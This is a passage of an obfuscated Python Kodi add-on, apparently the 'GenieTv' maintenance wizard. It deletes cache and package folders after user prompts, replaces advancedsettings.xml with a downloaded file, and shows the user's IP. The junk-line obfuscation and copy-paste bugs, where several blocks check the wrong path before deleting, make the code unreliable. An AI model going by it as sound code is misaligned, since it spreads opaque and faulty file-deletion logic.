   if 15 - 15: OOooOOo % Ooo00oOo00o / II1i1IiiIIi11
   if OO0Oo00 > 0 :
    if 36 - 36: Ooo00oOo00o + Ooo00oOo00o % Oo + Oo / i1IIi % i1IIi
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( OO0Oo00 ) + " files found in 'Other'" , "Do you want to delete them?" ) :
     if 20 - 20: i11i1 * Ooo0OO0oOO
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 91 - 91: Ooo00oOo00o % i1IIi - iIii1I11I1II1 . i11i1
   else :
    pass
  IIiiIiIIiI1 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  if 39 - 39: OOoo0OO0 / OoooooooOO - oO0O + Ooo00oOo00o / I1IiI
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( IIiiIiIIiI1 ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 87 - 87: I1I1ii
   if OO0Oo00 > 0 :
    if 32 - 32: OOoo0OO0 - i11i1 * O0 % iI1Ii11iII1 . iI1Ii11iII1 . OOOo0
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ATV2 Cache Files" , str ( OO0Oo00 ) + " files found in 'LocalAndRental'" , "Do you want to delete them?" ) :
     if 91 - 91: i1IIi . II1i1IiiIIi11
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 37 - 37: II1i1IiiIIi11 - OOoo0OO0 + iIii1I11I1II1 / I1I1ii - Ooo00oOo00o . OOooOOo
   else :
    pass
    if 62 - 62: ii11ii1ii
    if 47 - 47: I1I1ii % i11i1 * Ooo00oOo00o . iIii1I11I1II1 % Oo + OoooooooOO
    if 2 - 2: I1I1ii % OoooooooOO - oOO * ii11ii1ii * iI1Ii11iII1
    if 99 - 99: iIii1I11I1II1 . Oo / oOO . i11i1 % OOOo0 * OOoo0OO0
 o0o0Oo0oo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( o0o0Oo0oo ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( o0o0Oo0oo ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 53 - 53: I1I1ii + i1IIi . Ooo00oOo00o / i11iIiiIii + oO0O % I1IiI
   if 9 - 9: oOO . OOoo0OO0 - Oo . I1I1ii
   if OO0Oo00 > 0 :
    if 39 - 39: i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete WTF Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 70 - 70: iI1Ii11iII1 % Ooo00oOo00o % OOOo0
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 95 - 95: I1IiI - I1I1ii / O0 * OOOo0 - OOooOOo
   else :
    pass
    if 12 - 12: iIii1I11I1II1 % Oo . II1i1IiiIIi11 . iI1Ii11iII1 % i11iIiiIii
    if 2 - 2: Ooo0OO0oOO * Ooo0OO0oOO . I1IiI * oO0O * iIii1I11I1II1
 I1ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.4od/cache' ) , '' )
 if os . path . exists ( I1ii ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( I1ii ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 96 - 96: oO0O
   if 24 - 24: O0
   if OO0Oo00 > 0 :
    if 33 - 33: OoooooooOO + Ooo0OO0oOO * OoOoOO00 / i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete 4oD Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 87 - 87: OoooooooOO
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 1 - 1: iIii1I11I1II1 / OOooOOo
   else :
    pass
    if 98 - 98: O0 % OOOo0 / OoooooooOO * ii11ii1ii - Ooo0OO0oOO
    if 51 - 51: II1i1IiiIIi11 + OOoo0OO0
 Oo0ooO0O0o00o = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( Oo0ooO0O0o00o ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( Oo0ooO0O0o00o ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 75 - 75: ii11ii1ii
   if 92 - 92: i11i1 % OoOoOO00 . II1i1IiiIIi11
   if OO0Oo00 > 0 :
    if 46 - 46: I1IiI + OOOo0 % OoooooooOO * i11iIiiIii - Oo
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete BBC iPlayer Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 47 - 47: II1i1IiiIIi11 * I1IiI * iI1Ii11iII1
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 46 - 46: oO0O
   else :
    pass
    if 42 - 42: iIii1I11I1II1
    if 32 - 32: Oo - oO0O . OoooooooOO - OoooooooOO - Oo . iIii1I11I1II1
    if 34 - 34: Oo
 IiI1I1i1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( IiI1I1i1 ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( IiI1I1i1 ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 6 - 6: OOOo0 . OoOoOO00 + I1I1ii / Ooo00oOo00o % OOOo0 . OoooooooOO
   if 64 - 64: iIii1I11I1II1 + OoOoOO00 . II1i1IiiIIi11 % Oo * oOO
   if OO0Oo00 > 0 :
    if 7 - 7: i1IIi + i1IIi / iI1Ii11iII1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Simple Downloader Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 32 - 32: oO0O * ii11ii1ii - OoooooooOO / OOOo0 . oOO - i1IIi
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 60 - 60: I1IiI % I1IiI
   else :
    pass
    if 2 - 2: oO0O . O0 - Ooo0OO0oOO + iI1Ii11iII1
    if 96 - 96: oO0O + oO0O
 iiiIi1Iiii1I = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( iiiIi1Iiii1I ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 54 - 54: oOO - iIii1I11I1II1 - OOoo0OO0 % oO0O / OoOoOO00
   if 80 - 80: i11iIiiIii % iIii1I11I1II1 / i11iIiiIii
   if OO0Oo00 > 0 :
    if 66 - 66: I1IiI . iIii1I11I1II1 * ii11ii1ii - oO0O - iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete ITV Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 28 - 28: I1IiI % OoooooooOO
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 13 - 13: iI1Ii11iII1 . Oo - OOoo0OO0 / Ooo0OO0oOO - Oo - OOOo0
   else :
    pass
    if 84 - 84: OoOoOO00
    if 57 - 57: O0 * iIii1I11I1II1 % O0 . OoooooooOO
 O00O = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.movies4me/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( O00O ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 42 - 42: OOooOOo + Ooo0OO0oOO - OoooooooOO + II1i1IiiIIi11 % Ooo00oOo00o
   if 12 - 12: i1IIi / ii11ii1ii - II1i1IiiIIi11 . i11iIiiIii / i1IIi / OoooooooOO
   if OO0Oo00 > 0 :
    if 88 - 88: oO0O / i11iIiiIii % I1IiI % i11i1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Movies4me Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 70 - 70: ii11ii1ii . ii11ii1ii / OOoo0OO0 . ii11ii1ii
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 37 - 37: i1IIi . I1I1ii - OoOoOO00 % OOooOOo - i1IIi . Ooo0OO0oOO
   else :
    pass
    if 34 - 34: iIii1I11I1II1 / OoOoOO00
    if 3 - 3: OOooOOo - OoooooooOO + II1i1IiiIIi11 . OOoo0OO0
 o00000Oo = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( o00000Oo ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 63 - 63: OoOoOO00 * OOOo0 - OoooooooOO / OOOo0
   if 50 - 50: I1IiI % oO0O + I1IiI * oO0O - i11i1
   if OO0Oo00 > 0 :
    if 94 - 94: iIii1I11I1II1
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Phoenix Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 1 - 1: O0
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 2 - 2: Ooo00oOo00o . OOoo0OO0
   else :
    pass
    if 97 - 97: Oo
    if 65 - 65: Oo % i11i1 / i11iIiiIii / iIii1I11I1II1 . I1I1ii + oOO
 o0000oo0O = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.spotitube/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( o0000oo0O ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 89 - 89: i11iIiiIii / O0 - i1IIi % Oo + i11iIiiIii
   if 44 - 44: i11iIiiIii / i11i1 * oOO
   if OO0Oo00 > 0 :
    if 88 - 88: i1IIi % i11i1 / OoooooooOO * II1i1IiiIIi11 % oOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Music Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 5 - 5: ii11ii1ii * oO0O % OOoo0OO0 % OoOoOO00
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 9 - 9: OOooOOo % I1I1ii + OOoo0OO0
   else :
    pass
    if 55 - 55: Ooo00oOo00o - ii11ii1ii
    if 38 - 38: iIii1I11I1II1 % iI1Ii11iII1 % Ooo00oOo00o % O0 * iIii1I11I1II1 / I1I1ii
 o00O00oO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.supercartoons/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( o00O00oO ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 64 - 64: ii11ii1ii * oO0O * Oo % iI1Ii11iII1 % oOO
   if 55 - 55: OoOoOO00 - I1I1ii - i11i1 % oO0O
   if OO0Oo00 > 0 :
    if 49 - 49: Oo * I1I1ii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete SuperCartoons Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 53 - 53: Oo / oO0O + Ooo0OO0oOO . II1i1IiiIIi11 + iI1Ii11iII1
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 19 - 19: oO0O
   else :
    pass
    if 51 - 51: iIii1I11I1II1
    if 8 - 8: Ooo00oOo00o / OOooOOo % II1i1IiiIIi11 . i11iIiiIii . OoooooooOO . oO0O
 iIII1iIiIIIIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.tvonline.cc/cache' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( iIII1iIiIIIIi ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 50 - 50: OOOo0
   if 4 - 4: Oo * O0 - Ooo0OO0oOO % oOO + I1IiI
   if OO0Oo00 > 0 :
    if 3 - 3: I1IiI
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete TVonline Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 91 - 91: O0 - OOoo0OO0 % I1I1ii
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 46 - 46: oOO / OOOo0 . iI1Ii11iII1 % Ooo00oOo00o / i11iIiiIii
   else :
    pass
    if 13 - 13: I1I1ii % OOooOOo + i11i1 + I1I1ii + i11iIiiIii - ii11ii1ii
    if 70 - 70: OoOoOO00 * OoOoOO00 . OOOo0
 iiIi1111iiI1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.youtube/kodion' ) , '' )
 if os . path . exists ( iiiIi1Iiii1I ) == True :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( iiIi1111iiI1 ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 85 - 85: OOoo0OO0 + I1I1ii
   if 11 - 11: OOoo0OO0
   if OO0Oo00 > 0 :
    if 95 - 95: Oo + i11iIiiIii % i11i1 - Ooo0OO0oOO
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete YouTube Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 11 - 11: ii11ii1ii / O0 + OoOoOO00
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
      if 95 - 95: I1I1ii + iI1Ii11iII1 * iIii1I11I1II1
   else :
    pass
    if 17 - 17: Ooo00oOo00o - Oo * O0 / oO0O
    if 19 - 19: i1IIi - iIii1I11I1II1 . OOoo0OO0
    if 2 - 2: oO0O
 Ii1i111iI = xbmc . translatePath ( 'special://masterprofile/addon_data/plugin.video.genesis' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 try :
  if i1iiIIiiI111 . yesno ( "Delete Genesis Cache Files" , "Do you want to delete cache" ) :
   iII1ii = os . path . join ( Ii1i111iI , "cache.db" )
   os . unlink ( iII1ii )
   if 51 - 51: OOooOOo . ii11ii1ii * oO0O / Oo * OoOoOO00 / O0
 except :
  pass
  if 44 - 44: i11iIiiIii % I1I1ii % Ooo0OO0oOO + OOoo0OO0 * Ooo0OO0oOO . oO0O
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "                               Finished Deleting Cache " , "                          [COLOR gold]Brought To You By GenieTv[/COLOR]" )
 if 89 - 89: OoooooooOO % OoOoOO00 - Ooo00oOo00o % i11iIiiIii
 if 7 - 7: iI1Ii11iII1
 if 15 - 15: Oo + II1i1IiiIIi11 + OOOo0 * OOooOOo
 if 33 - 33: OOooOOo * Oo
 if 88 - 88: I1I1ii % i11i1 - I1IiI - I1IiI . OOOo0
 if 52 - 52: OoOoOO00 / OoOoOO00 / OOOo0 - I1I1ii
 if 91 - 91: OOOo0 + OOooOOo % OoOoOO00 + Ooo00oOo00o
 if 66 - 66: iIii1I11I1II1 * OoOoOO00 % Oo % OOOo0 - oO0O
 if 59 - 59: iI1Ii11iII1 % Ooo0OO0oOO
def IiIIiIiIIiI ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1ii11I1IiI = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( I1ii11I1IiI ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 20 - 20: Ooo00oOo00o
   if 99 - 99: Oo + OoooooooOO . II1i1IiiIIi11 + O0
   if OO0Oo00 > 0 :
    if 85 - 85: OoOoOO00 - oO0O
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 93 - 93: iI1Ii11iII1 / i11iIiiIii - Ooo0OO0oOO + Ooo00oOo00o / i1IIi
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 if 62 - 62: ii11ii1ii / OoooooooOO * OOOo0 - i1IIi
 if 81 - 81: Ooo0OO0oOO / O0 * oOO % I1IiI / O0
 if 85 - 85: OoooooooOO + OoooooooOO
 if 23 - 23: i1IIi
 if 31 - 31: Oo - iIii1I11I1II1 / OOoo0OO0 . Ooo00oOo00o
 if 74 - 74: Oo - OoOoOO00 - iI1Ii11iII1
 if 50 - 50: OOOo0 - Ooo0OO0oOO + Ooo0OO0oOO * OOoo0OO0 + Ooo0OO0oOO
 if 70 - 70: i1IIi % Ooo00oOo00o / i1IIi
 if 30 - 30: I1IiI - i11iIiiIii
def oO0OOOO00o ( url ) :
 print '###' + o0oOoO00o + ' - DELETING PACKAGES###'
 I1ii11I1IiI = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 try :
  for I1i1iii1Ii , i1oO0OO0 , o0O0Oo00 in os . walk ( I1ii11I1IiI ) :
   OO0Oo00 = 0
   OO0Oo00 += len ( o0O0Oo00 )
   if 26 - 26: oOO + I1IiI
   if 17 - 17: ii11ii1ii - II1i1IiiIIi11 % Oo * O0 % O0 * i11i1
   if OO0Oo00 > 0 :
    if 6 - 6: I1I1ii
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    if i1iiIIiiI111 . yesno ( "Delete Package Cache Files" , str ( OO0Oo00 ) + " files found" , "Do you want to delete them?" ) :
     if 46 - 46: OoOoOO00 * I1I1ii
     for ooOOo00O00Oo in o0O0Oo00 :
      os . unlink ( os . path . join ( I1i1iii1Ii , ooOOo00O00Oo ) )
     for oO0o00oOOooO0 in i1oO0OO0 :
      shutil . rmtree ( os . path . join ( I1i1iii1Ii , oO0o00oOOooO0 ) )
     i1iiIIiiI111 = xbmcgui . Dialog ( )
     i1iiIIiiI111 . ok ( o0oOoO00o , "       Deleting Packages all done" )
    else :
     pass
   else :
    i1iiIIiiI111 = xbmcgui . Dialog ( )
    i1iiIIiiI111 . ok ( o0oOoO00o , "       No Packages to DELETE" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "Error Deleting Packages please visit Kodi Support Group, GenieTv on facebook" )
 return
 iII1 ( url )
 if 23 - 23: i1IIi - O0
 if 6 - 6: oOO % OoooooooOO * I1I1ii - iI1Ii11iII1
 if 24 - 24: OOoo0OO0 / iIii1I11I1II1 . OoooooooOO % I1IiI . oO0O
 if 73 - 73: I1I1ii
 if 25 - 25: iI1Ii11iII1
 if 77 - 77: OOooOOo . iIii1I11I1II1 . OoooooooOO . iIii1I11I1II1
 if 87 - 87: OoOoOO00 - OoooooooOO / i1IIi . oO0O - Oo . i11iIiiIii
 if 47 - 47: Oo % Ooo00oOo00o - oOO - Oo * Ooo0OO0oOO
 if 72 - 72: OOooOOo % OOooOOo + II1i1IiiIIi11 + ii11ii1ii / Oo
def IIIiii ( url , name ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml' )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1IIi11 = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml.bak' )
 if os . path . exists ( i1IIi11 ) == False :
  if i1iiIIiiI111 . yesno ( "Back Up Original" , 'Have You Backed Up Your Original?' , '' , "[B][COLOR red]     AS YOU CANNOT GO BACK !!![/B][/COLOR]" ) :
   print '###' + o0oOoO00o + ' - ADVANCED XML###'
   Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
   I11OoooO = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml' )
   try :
    os . remove ( I11OoooO )
    print '=== GenieTv - REMOVING    ' + str ( I11OoooO ) + '    ==='
   except :
    pass
   oo0OoOOO0o0 = i1 . http_GET ( url ) . content
   IiII1 = open ( I11OoooO , "w" )
   IiII1 . write ( oo0OoOOO0o0 )
   IiII1 . close ( )
   print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 else :
  print '###' + o0oOoO00o + ' - ADVANCED XML###'
  Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
  I11OoooO = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml' )
  try :
   os . remove ( I11OoooO )
   print '=== GenieTv - REMOVING    ' + str ( I11OoooO ) + '    ==='
  except :
   pass
  oo0OoOOO0o0 = i1 . http_GET ( url ) . content
  IiII1 = open ( I11OoooO , "w" )
  IiII1 . write ( oo0OoOOO0o0 )
  IiII1 . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Done Adding new Advanced XML" )
 return
 if 93 - 93: I1IiI . Oo
def oOOO00OOo ( url , name ) :
 print '###' + o0oOoO00o + ' - CHECK ADVANCE XML###'
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml' )
 try :
  IiII1 = open ( I11OoooO ) . read ( )
  if 'zero' in IiII1 :
   name = '0CACHE'
  elif 'tuxen' in IiII1 :
   name = 'TUXENS'
  elif 'muckys' in IiII1 :
   name = 'MUCKYS'
  elif 'p2p1' in IiII1 :
   name = '1st P2P RECOMMENDED'
  elif 'p2p2' in IiII1 :
   name = '2nd P2P RECOMMENDED'
  elif 'mikey' in IiII1 :
   name = 'MIKEY1234'
 except :
  name = "NO ADVANCED"
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( o0oOoO00o , "[COLOR yellow]YOU HAVE[/COLOR] " + name + "[COLOR yellow] XML SETTINGS SETUP[/COLOR]" )
 return
 if 93 - 93: oOO
def IiiIiIIiiIiI ( url ) :
 print '###' + o0oOoO00o + ' - DELETING ADVANCE XML###'
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 I11OoooO = os . path . join ( Oo0OO0000oooo , 'advancedsettings.xml' )
 try :
  os . remove ( I11OoooO )
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  print '=== GenieTv - DELETING    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Remove Advanced Settings Sucessfull" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       No Advanced Settings To Remove" )
 return
 if 49 - 49: oO0O . ii11ii1ii % oOO . Oo * i11i1
 if 44 - 44: iIii1I11I1II1 / O0 * Oo + OOOo0 . oOO
 if 20 - 20: II1i1IiiIIi11 + OOooOOo . I1I1ii / i11iIiiIii
 if 7 - 7: I1IiI / I1IiI . I1I1ii * O0 + iI1Ii11iII1 + Ooo0OO0oOO
 if 98 - 98: OoOoOO00 * iI1Ii11iII1 - OOOo0 % OOooOOo - II1i1IiiIIi11 % ii11ii1ii
 if 69 - 69: i1IIi % Ooo00oOo00o % I1I1ii / oOO / oOO
 if 6 - 6: OoOoOO00 % ii11ii1ii % i1IIi * oOO
 if 47 - 47: O0
 if 55 - 55: Ooo00oOo00o % O0 / OoooooooOO
 if 49 - 49: OOOo0 . Ooo00oOo00o * OoooooooOO % i11iIiiIii + iIii1I11I1II1 * i1IIi
def oOO0oOoooOoo0 ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 OoOO0oo0o = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( i1 . http_GET ( url ) . content )
 for Ii11I1i , iI11IIi1iiI1I , oO0o , O0ooOoO0 in OoOO0oo0o :
  if inc < 2 : i1iiIIiiI111 = xbmcgui . Dialog ( ) ; i1iiIIiiI111 . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % Ii11I1i , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % oO0o , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % O0ooOoO0 )
  inc = inc + 1
  if 10 - 10: i11iIiiIii % i11i1 * II1i1IiiIIi11 % Oo
  if 51 - 51: Ooo00oOo00o % II1i1IiiIIi11
  if 24 - 24: OOOo0 / iIii1I11I1II1 / O0 . iIii1I11I1II1 - Ooo00oOo00o . iIii1I11I1II1
  if 8 - 8: ii11ii1ii % Ooo00oOo00o % Ooo0OO0oOO . ii11ii1ii * ii11ii1ii
  if 94 - 94: i11iIiiIii + OoooooooOO
  if 20 - 20: i11iIiiIii
  if 86 - 86: I1IiI / i11i1
  if 40 - 40: iIii1I11I1II1 / oOO / OOOo0 + ii11ii1ii * i11i1
  if 1 - 1: Ooo00oOo00o * oOO + iI1Ii11iII1 . Ooo0OO0oOO / oOO
def O0O00Oo ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
